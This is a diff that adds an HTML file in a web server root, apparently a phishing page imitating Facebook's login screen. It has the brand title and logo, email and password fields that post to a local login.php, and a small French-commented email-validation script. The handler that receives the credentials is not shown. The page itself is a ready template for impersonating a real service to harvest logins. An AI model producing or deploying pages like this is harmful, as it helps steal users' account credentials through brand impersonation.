@@ -1,0 +1,83 @@
+<!-- /var/www/html/index.html -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Facebook – log in or sign up</title>
+  <style>
+    body {
+      background-color: #f0f2f5;
+      font-family: Arial, sans-serif;
+    }
+    .login-container {
+      width: 360px;
+      margin: 100px auto;
+      padding: 20px;
+      background-color: white;
+      box-shadow: 0px 0px 10px rgba(0,0,0,0.1);
+      border-radius: 8px;
+    }
+    .logo {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    .logo img {
+      width: 200px;
+    }
+    input[type="email"],
+    input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: 1px solid #ddd;
+      border-radius: 5px;
+    }
+    input[type="submit"] {
+      width: 100%;
+      background-color: #1877f2;
+      border: none;
+      color: white;
+      padding: 14px;
+      font-size: 16px;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+    .forgot {
+      text-align: center;
+      margin-top: 12px;
+      color: #1877f2;
+      font-size: 14px;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="login-container">
+    <div class="logo">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook">
+    </div>
+    <form action="login.php" method="POST" id="loginForm">
+      <input type="email" name="email" placeholder="Email address" required>
+      <input type="password" name="pass" placeholder="Password" required>
+      <input type="submit" value="Log In">
+    </form>
+    <div class="forgot">
+      Forgotten password?
+    </div>
+  </div>
+
+  <!-- Validation JavaScript -->
+  <script>
+    document.getElementById("loginForm").addEventListener("submit", function(e) {
+      const email = document.querySelector('input[name="email"]').value;
+      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+      if (!emailRegex.test(email)) {
+        alert("Veuillez entrer une adresse email valide.");
+        e.preventDefault(); // Bloque l'envoi du formulaire
+      }
+    });
+  </script>
+
+</body>
+</html>
